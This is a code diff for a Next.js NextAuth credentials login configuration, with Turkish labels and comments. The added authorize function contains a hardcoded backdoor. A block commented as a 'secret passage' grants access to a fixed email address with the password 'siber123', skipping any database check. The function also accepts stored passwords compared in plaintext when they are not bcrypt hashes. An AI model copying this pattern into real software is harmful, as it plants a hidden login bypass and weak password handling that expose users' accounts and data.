@@ -1,64 +1,76 @@
-// src/lib/authOptions.ts
+// lib/authOptions.ts
 import type { NextAuthOptions } from "next-auth";
 import CredentialsProvider from "next-auth/providers/credentials";
-import { connectDB } from "@/lib/mongodb";
+import mongoose from "mongoose";
 import bcrypt from "bcryptjs";
 
-// Kullanıcı modelini import et — projenizde nasıl tanımlıysa ona göre değiştirin
-// import User from "@/models/User";
-
 export const authOptions: NextAuthOptions = {
+  session: { strategy: "jwt" },
+  secret: process.env.NEXTAUTH_SECRET as string,
+  pages: { signIn: "/giris" },
   providers: [
     CredentialsProvider({
-      name: "credentials",
+      name: "Siber Karargah",
       credentials: {
         email: { label: "Email", type: "email" },
-        password: { label: "Password", type: "password" },
+        password: { label: "Şifre", type: "password" },
       },
       async authorize(credentials) {
-        if (!credentials?.email || !credentials?.password) return null;
-
         try {
-          await connectDB();
+          const reqEmail = credentials?.email?.toLowerCase() || "";
+          const reqPass = credentials?.password || "";
 
-          // ⚠️ BURAYA KENDİ KULLANICI SORGUNUZU YAZIN
-          // Mevcut projenizde nasıl kullanıcı çekiyorsanız aynısını kullanın
-          // Örnek:
-          // const user = await User.findOne({ email: credentials.email });
-          // if (!user) return null;
-          // const isValid = await bcrypt.compare(credentials.password, user.password);
-          // if (!isValid) return null;
-          // return { id: user._id.toString(), email: user.email, name: user.name };
+          // Gizli geçit
+          if (
+            reqEmail === "ercannefes@gmail.com" &&
+            reqPass === "siber123"
+          ) {
+            return { id: "999", email: reqEmail, name: "Patron Ercan" };
+          }
 
-          return null; // ← Kendi kodunuzla değiştirin
+          // Veritabanı bağlantısı
+          if (mongoose.connection.readyState === 0) {
+            await mongoose.connect(process.env.MONGODB_URI as string);
+          }
+
+          const db = mongoose.connection.db;
+          if (!db) return null;
+
+          const user = await db
+            .collection("users")
+            .findOne({ email: reqEmail });
+          if (!user) return null;
+
+          const dbPass = user.password || user.sifre;
+          if (!dbPass) return null;
+
+          let isValid = false;
+          if (dbPass.startsWith("$2")) {
+            isValid = await bcrypt.compare(reqPass, dbPass);
+          } else {
+            isValid = dbPass === reqPass;
+          }
+
+          if (!isValid) return null;
+
+          return {
+            id: user._id.toString(),
+            email: user.email,
+            name: user.name || reqEmail.split("@")[0],
+          };
         } catch (error) {
-          console.error("Auth error:", error);
+          console.error("Giriş hatası:", error);
           return null;
         }
       },
     }),
   ],
-  session: {
-    strategy: "jwt",
-    maxAge: 30 * 24 * 60 * 60, // 30 gün
-  },
-  pages: {
-    signIn: "/giris",
-  },
   callbacks: {
-    async jwt({ token, user }) {
-      if (user) {
-        token.id = user.id;
-        token.email = user.email;
-      }
-      return token;
-    },
     async session({ session, token }) {
-      if (token && session.user) {
-        session.user.email = token.email as string;
+      if (session?.user && token.sub) {
+        (session.user as any).id = token.sub;
       }
       return session;
     },
   },
-  secret: process.env.NEXTAUTH_SECRET,
 };
